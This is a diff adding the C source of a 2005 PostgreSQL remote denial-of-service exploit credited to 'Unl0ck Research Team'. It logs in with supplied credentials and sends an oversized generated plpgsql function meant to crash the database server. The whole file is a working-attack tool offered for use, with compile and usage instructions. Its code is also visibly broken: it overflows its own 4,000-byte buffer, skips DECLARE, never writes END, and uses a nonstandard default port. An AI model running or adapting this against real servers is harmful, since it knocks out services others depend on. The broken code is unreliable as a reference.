@@ -1,0 +1,156 @@
+/* PostgreSQL Remote Reboot <=8.01 
+ * writen by ChoiX [choix@unl0ck.org]
+ * (c) Unl0ck Research Team [www.unl0ck.org]
+ *	info: Server can be rebooted only if plpgsql language is switched on.
+ *		To compilate exploit you should have "libpq" library on your box 
+ *		and use command $ cc -o pgsql_reboot pgsql_reboot.c -I/usr/local/pgsql/include  -L/usr/local/pgsql/lib -lpq
+ *		Root exploits will be released later, coz now it's very dangerous to release it.
+ *	greets to: 
+ *			unl0ck members: DarkEagle, crash-x, nekd0, xtix, [0xdeadbabe]
+ *			m00 members: ov3r 
+ */
+#include <stdio.h>
+#include <getopt.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <libpq-fe.h>
+
+#define DEFAULT_PORT "5321"
+#define DEFAULT_DB "postgresql"
+#define FUNC_NAME "uKt_test"
+#define TABLE_NAME "unl0ck_table" 
+
+char str[4000];
+char create[]="CREATE OR REPLACE FUNCTION %s RETURNS integer AS $$\n";
+char declare[] = "DECLARE\n";
+char com[] = "\t--%\n";
+char varible_REC[] = "\trec RECORD;\n";
+char varible_var[] = "\tvar%d varchar := \'BBBB\';\n";
+char begin[] = "BEGIN\n";
+char select_1[] = "SELECT INTO rec FROM %s WHERE\n";
+char select_2[] = "var%d = AAAA AND\n";
+char select_3[] = "var1029 = AAAA;\n";
+char end[] = "END\n";
+char finish[] = "$$ LANGUAGE plpgsql\n";
+
+
+void usage(char *name){
+printf("PostgreSQL Remote DoS <=8.0.1\n");
+printf("writen by ChoiX [choix@unl0ck.org]\n");
+printf("(c) Unl0ck Research Team [info@unl0ck.org]\n");
+printf("Usage: %s -H <host_address> [-P <port>] -u <user_name> -p <password> [-d <database_name>] \n", name);
+printf("Default port = %s\nDefault dbname = %s\n", DEFAULT_PORT, DEFAULT_DB);
+exit(0);
+}
+
+int make_str();
+
+int main(int argc, char *argv[]){
+char opt;
+char *host = NULL, *port = NULL, *user = NULL, *password = NULL, *dbname = NULL;
+struct hostent *he;
+PGconn *conn;
+PGresult *res;
+
+while((opt = getopt(argc, argv, "H:P:u:p:d:")) != EOF){
+	switch(opt){
+		case 'H':
+			host = optarg;
+			break;
+		case 'P':
+			port = optarg;
+			break;
+		case 'u':
+			user = optarg;
+			break;
+		case 'p':
+			password = optarg;
+			break;
+		case 'd':
+			dbname = optarg;
+			break;
+		default:
+			usage(argv[0]);
+			break;
+	}
+}
+if(host == NULL) usage(argv[0]);
+if(user == NULL) usage(argv[0]);
+if(password == NULL) usage(argv[0]);
+if(port == NULL) port = DEFAULT_PORT; 
+if(dbname == NULL) dbname = DEFAULT_DB;
+
+printf("\tPostgreSQL Remote DoS <=8.0.1\n");
+printf("[*] Host/Port: %s/%s\n", host, port);
+printf("[*] DBname/User/Password: %s/%s/%s\n", dbname, user, password); 
+
+conn = PQsetdbLogin(host, port, NULL, NULL, dbname, user, password);
+if(PQstatus(conn) == CONNECTION_BAD){
+	PQfinish(conn);
+	printf("[-] Cannot connect to the database\n");
+	exit(1);
+}
+printf("[+] Connected to the database\n");
+
+make_str();
+printf("[+] Command has been generated\n");
+res = PQexec(conn, str);
+if (PQresultStatus(res) == PGRES_TUPLES_OK){
+	printf("[+] Command has been sent\n");
+}
+if(PQstatus(conn) == CONNECTION_BAD){
+	printf("[+] Server has been rebooted\n");
+	exit(0);
+} else {
+	printf("[-] Server hasnt been rebooted\n");
+	exit(0);
+}
+}
+
+int make_str(){
+char temp[100];
+int i;
+int len = sizeof(temp) -1;
+
+//write char create[]
+snprintf(temp, len, create, FUNC_NAME); 
+strcpy(str,temp);
+//write char declare[] 
+snprintf(temp, len, begin);
+strcat(str, temp);
+//write char varible_REC[]
+snprintf(temp, len, varible_REC);
+strcat(str, temp);
+//write char varible_var[]
+for(i = 0;i < 1029;i++){
+	snprintf(temp, len, varible_var, i);
+	strcat(str, temp);
+}
+//write char begin[]
+snprintf(temp, len, begin);
+strcat(str, temp);
+//write char select_1[]
+snprintf(temp, len, select_1, TABLE_NAME);
+strcat(str, temp);
+//write char select_2[]
+for(i = 0;i < 1028;i++){
+	snprintf(temp, len, select_2, i);
+	strcat(str, temp);
+}
+//write char select_3[]
+snprintf(temp, len, select_3);
+strcat(str, temp);
+//write char end[]
+snprintf(temp, len, temp);
+strcat(str, temp);
+//write char finish[]
+snprintf(temp, len, finish);
+strcat(str,temp);
+
+return 0;
+}
+
+
+
+// milw0rm.com [2005-04-19]
